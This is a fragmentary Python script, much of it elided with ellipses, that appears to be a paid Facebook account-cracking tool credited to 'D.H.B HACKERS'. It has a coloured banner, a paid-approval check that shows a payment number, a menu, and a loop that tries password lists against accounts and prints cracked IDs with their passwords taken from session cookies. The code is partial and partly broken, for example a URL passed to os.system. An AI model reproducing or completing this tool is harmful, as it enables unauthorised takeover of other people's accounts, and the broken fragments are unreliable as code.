...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ N3OB ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  LBODI TXT     
               \033[1;91mFACEBOK      :  KMATCHO  LM        
               \033[1;91mSTATUS       :   PAID      
               \033[1;97mTEAM         :  D.H.B HACKERS                 
               \033[1;91mTOOL VIRSION :  0.0           
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print('BKASH PERSONAL - +213669491481')
...
def menu():
	...
	if ot == '3':
		os.system('https://www.facebook.com/hamouda.ilyase')
		menu()
        ...
        for ps in pwx:
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mOMOR LS-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
